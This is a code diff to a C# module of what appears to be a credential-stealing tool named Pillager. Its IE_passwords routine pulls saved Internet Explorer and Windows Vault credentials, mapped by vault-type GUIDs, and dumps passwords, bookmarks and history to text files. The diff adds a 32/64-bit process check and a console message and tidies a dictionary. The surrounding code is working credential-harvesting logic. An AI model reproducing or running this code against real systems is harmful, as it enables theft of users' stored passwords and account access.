@@ -4,6 +4,7 @@ using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Reflection;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Text.RegularExpressions;
 
@@ -12,8 +13,25 @@ namespace Pillager.Browsers
     public static class IE
     {
         public static string BrowserName = "IE";
+
+        [DllImport("kernel32", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);
+
+        [DllImport("kernel32")]
+        public static extern IntPtr GetCurrentProcess();
+
         public static string IE_passwords()
         {
+            if (IntPtr.Size == 4)
+            {
+                bool is64Bit;
+                IsWow64Process(GetCurrentProcess(), out is64Bit);
+                if (is64Bit)
+                {
+                    return "Don't support recovery IE password from wow64 process";
+                }
+            }
             StringBuilder sb = new StringBuilder();
             var OSVersion = Environment.OSVersion.Version;
             var OSMajor = OSVersion.Major;
@@ -95,16 +113,18 @@ namespace Pillager.Browsers
 
             // Create dictionary to translate Guids to human readable elements
             IntPtr guidAddress = vaultGuidPtr;
-            Dictionary<Guid, string> vaultSchema = new Dictionary<Guid, string>();
-            vaultSchema.Add(new Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"), "Windows Secure Note");
-            vaultSchema.Add(new Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"), "Windows Web Password Credential");
-            vaultSchema.Add(new Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"), "Windows Credential Picker Protector");
-            vaultSchema.Add(new Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"), "Web Credentials");
-            vaultSchema.Add(new Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"), "Windows Credentials");
-            vaultSchema.Add(new Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"), "Windows Domain Certificate Credential");
-            vaultSchema.Add(new Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"), "Windows Domain Password Credential");
-            vaultSchema.Add(new Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"), "Windows Extended Credential");
-            vaultSchema.Add(new Guid("00000000-0000-0000-0000-000000000000"), null);
+            Dictionary<Guid, string> vaultSchema = new Dictionary<Guid, string>
+            {
+                { new Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"), "Windows Secure Note" },
+                { new Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"), "Windows Web Password Credential" },
+                { new Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"), "Windows Credential Picker Protector" },
+                { new Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"), "Web Credentials" },
+                { new Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"), "Windows Credentials" },
+                { new Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"), "Windows Domain Certificate Credential" },
+                { new Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"), "Windows Domain Password Credential" },
+                { new Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"), "Windows Extended Credential" },
+                { new Guid("00000000-0000-0000-0000-000000000000"), null }
+            };
 
             for (int i = 0; i < vaultCount; i++)
             {
@@ -271,6 +291,7 @@ namespace Pillager.Browsers
             File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
             File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
             File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
+            Console.WriteLine("Files wrote to " + savepath);
         }
     }
 }
